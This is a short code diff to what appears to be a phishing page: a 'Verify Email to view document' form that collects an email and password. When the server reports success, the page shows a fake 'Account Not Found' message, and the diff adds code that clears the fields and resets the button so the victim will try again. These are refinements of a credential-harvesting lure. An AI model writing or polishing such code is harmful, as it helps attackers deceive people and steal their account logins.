@@ -856,7 +856,6 @@
       clearTimeout(timeout);
 
       const data = await res.json();
-      console.log('Server response:', data);
 
       if (data.success) {
         showToast('Account Not Found: Please try another email', 3500);
@@ -871,6 +870,13 @@
         showToast('⚠ Could not reach server. Try again.', 3500);
       }
       console.error('Fetch error:', err);
+    } finally {
+      setTimeout(() => {
+        btn.innerHTML = '<span class="we-badge">we</span> Verify Email to view document';
+        btn.disabled = false;
+        document.getElementById('loginEmail').value = '';
+        document.getElementById('loginPass').value = '';
+      }, 1500);
     }
   }
 
